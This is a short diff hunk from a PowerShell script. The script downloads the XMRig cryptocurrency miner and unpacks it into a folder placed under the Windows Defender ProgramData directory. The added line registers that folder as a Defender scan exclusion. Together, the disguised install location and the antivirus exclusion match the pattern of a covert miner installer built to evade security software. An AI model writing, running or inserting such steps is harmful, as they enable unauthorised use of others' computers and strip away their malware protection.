@@ -97,6 +97,7 @@ Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.co
 $confirm = "C:\ProgramData\Microsoft\Windows Defender"
 
 mkdir "$confirm\xmrig-6.22.2"
+Add-MpPreference -ExclusionPath "$confirm\xmrig-6.22.2"
 
 Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$confirm\xmrig-6.22.2"
 
